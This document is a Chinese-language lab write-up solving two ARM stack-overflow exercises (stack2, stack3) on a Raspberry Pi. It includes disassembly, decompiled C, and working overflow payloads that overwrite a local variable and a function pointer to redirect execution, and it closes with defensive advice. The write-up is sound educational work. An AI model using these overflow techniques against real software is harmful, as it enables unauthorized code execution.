# arm栈溢出实验2

## 实验概述

### 【目的】
1. 运行stack2，获得输出`you have correctly modified the variable`
2. 运行stack3，获得输出`code flow successfully changed`
### 【环境】
Linux
### 【工具】
python,IDA pro

### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

## 实验步骤

### 【步骤】
#### stack2
先运行程序，可以发现程序主要从环境变量GREENIE读取用户输入数据。
```bash
pi@raspberrypi:~/ARM-challenges $ ./stack2
stack2: please set the GREENIE environment variable
pi@raspberrypi:~/ARM-challenges $ export GREENIE='hello'
pi@raspberrypi:~/ARM-challenges $ ./stack2
Try again, you got 0x00000000
```
```
pi@raspberrypi:~/ARM-challenges $ gdb stack2 -q
[*] No debugging session active
GEF for linux ready, type `gef' to start, `gef config' to configure
56 commands loaded for GDB 7.7.1 using Python engine 2.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from stack2...(no debugging symbols found)...done.
gef> disass stack2
No symbol table is loaded.  Use the "file" command.
gef> disass main
Dump of assembler code for function main:
   0x000104e4 <+0>:	push	{r11, lr}
   0x000104e8 <+4>:	add	r11, sp, #4
   0x000104ec <+8>:	sub	sp, sp, #80	; 0x50
   0x000104f0 <+12>:	str	r0, [r11, #-80]	; 0x50
   0x000104f4 <+16>:	str	r1, [r11, #-84]	; 0x54
   0x000104f8 <+20>:	ldr	r0, [pc, #108]	; 0x1056c <main+136>
   0x000104fc <+24>:	bl	0x10374
   0x00010500 <+28>:	str	r0, [r11, #-8]
   0x00010504 <+32>:	ldr	r3, [r11, #-8]
   0x00010508 <+36>:	cmp	r3, #0
   0x0001050c <+40>:	bne	0x1051c <main+56>
   0x00010510 <+44>:	mov	r0, #1
   0x00010514 <+48>:	ldr	r1, [pc, #84]	; 0x10570 <main+140>
   0x00010518 <+52>:	bl	0x103a4
   0x0001051c <+56>:	mov	r3, #0
   0x00010520 <+60>:	str	r3, [r11, #-12]
   0x00010524 <+64>:	sub	r3, r11, #76	; 0x4c
   0x00010528 <+68>:	mov	r0, r3
   0x0001052c <+72>:	ldr	r1, [r11, #-8]
   0x00010530 <+76>:	bl	0x10368
   0x00010534 <+80>:	ldr	r3, [r11, #-12]
   0x00010538 <+84>:	ldr	r2, [pc, #52]	; 0x10574 <main+144>
   0x0001053c <+88>:	cmp	r3, r2
   0x00010540 <+92>:	bne	0x10550 <main+108>
   0x00010544 <+96>:	ldr	r0, [pc, #44]	; 0x10578 <main+148>
   0x00010548 <+100>:	bl	0x10380
   0x0001054c <+104>:	b	0x10560 <main+124>
   0x00010550 <+108>:	ldr	r3, [r11, #-12]
   0x00010554 <+112>:	ldr	r0, [pc, #32]	; 0x1057c <main+152>
   0x00010558 <+116>:	mov	r1, r3
   0x0001055c <+120>:	bl	0x1035c
   0x00010560 <+124>:	mov	r0, r3
   0x00010564 <+128>:	sub	sp, r11, #4
   0x00010568 <+132>:	pop	{r11, pc}
   0x0001056c <+136>:	strdeq	r0, [r1], -r4
   0x00010570 <+140>:	strdeq	r0, [r1], -r12
   0x00010574 <+144>:	stceq	13, cr0, [r10, #-40]	; 0xffffffd8
   0x00010578 <+148>:	andeq	r0, r1, r12, lsr #12
   0x0001057c <+152>:	andeq	r0, r1, r8, asr r6
End of assembler dump.
```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [sp+8h] [bp-50h]@3
  int v5; // [sp+48h] [bp-10h]@3
  char *src; // [sp+4Ch] [bp-Ch]@1

  src = getenv("GREENIE");
  if ( !src )
    errx(1, "please set the GREENIE environment variable\n");
  v5 = 0;
  strcpy(&dest, src);
  if ( v5 == 218762506 )
    puts("you have correctly modified the variable");
  else
    printf("Try again, you got 0x%08x\n", v5);
  return 0;
}
```
可以看到我们这里需要溢出GREENIE使得v5为218762506，通过计算0xC - 0x10 = 64，那么有
```bash
pi@raspberrypi:~/ARM-challenges $ export GREENIE=`python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"'`
pi@raspberrypi:~/ARM-challenges $ ./stack2
you have correctly modified the variable
```
#### stack3

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+Ch] [bp-4Ch]@1
  void (*v5)(void); // [sp+4Ch] [bp-Ch]@1

  v5 = 0;
  gets(&s);
  if ( v5 )
  {
    printf("calling function pointer, jumping to 0x%08x\n", v5);
    v5();
  }
  return 0;
}
int win()
{
  return puts("code flow successfully changed");
}
```
其中有
```
0001047c <win>:
   1047c:	e92d4800 	push	{fp, lr}
   10480:	e28db004 	add	fp, sp, #4
   10484:	e59f0004 	ldr	r0, [pc, #4]	; 10490 <win+0x14>
   10488:	ebffffa5 	bl	10324 <puts@plt>
   1048c:	e8bd8800 	pop	{fp, pc}
   10490:	00010560 	.word	0x00010560
```
```
pi@raspberrypi:~/ARM-challenges $ strings stack3 -tx
    134 /lib/ld-linux-armhf.so.3
    239 libc.so.6
    243 gets
    248 puts
    24d abort
    253 printf
    25a __libc_start_main
    26c __gmon_start__
    27b GLIBC_2.4
    560 code flow successfully changed
    580 calling function pointer, jumping to 0x%08x
    6e0 GCC: (Raspbian 4.9.2-10) 4.9.2
```
所以我们只需要将程序跳转到执行win函数即可。
```
pi@raspberrypi:~/ARM-challenges $ python -c "print 'a'*64 + '\x7c\x04\x01\x00'" | ./stack3
calling function pointer, jumping to 0x0001047c
code flow successfully changed

```
### 【总结】

这次实验通过栈溢出简单的熟悉了arm下环境变量的设置和c语言的函数指针，需要注意的是，通过export设置的环境变量只对当前终端有效。
可以发现，要使栈溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。